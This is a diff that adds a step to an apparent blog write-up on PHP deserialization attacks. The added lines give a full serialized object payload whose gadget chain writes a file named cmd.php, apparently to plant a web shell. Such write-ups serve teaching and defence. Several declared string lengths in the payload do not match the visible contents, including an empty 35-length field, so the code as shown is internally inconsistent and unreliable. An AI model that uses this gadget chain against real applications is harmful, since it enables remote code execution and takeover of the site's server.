@@ -127,6 +127,10 @@ To summarize what we’ve covered so far:
   <img src="{{ site.url }}/images/all_the_magic_happens.jpg" alt="all_the_magic_happens" />
 </p>
 
+Let's put all the pieces together to create the final payload as a serialized object:
+
+`O:6:"Lyrics":2:{s:9:"*lyrics";s:12:"shell_lyrics";s:7:"*song";O:4:"Song":4:{s:9:"*logger";O:6:"Logger":1:{s:12:"*logwriter";O:14:"LogWriter_File":2:{s:11:"*filename";s:7:"cmd.php";s:9:"*format";O:13:"LogFileFormat":2:{s:10:"*filters";a:1:{i:0;O:12:"OutputFilter":2:{s:15:"*matchPattern";s:19:"/\[i\](.*)\[\/i\]/i";s:14:"*replacement";s:9:"\1";}}s:7:"*endl";s:1:" ";}}}s:7:"*name";s:35:"";s:8:"*group";s:11:"shell_group";s:6:"*url";s:19:"https:\/\/shell.com";}}`
+
 <br /><br />
 The final serialized payload will be as follows, in base64 format:
 
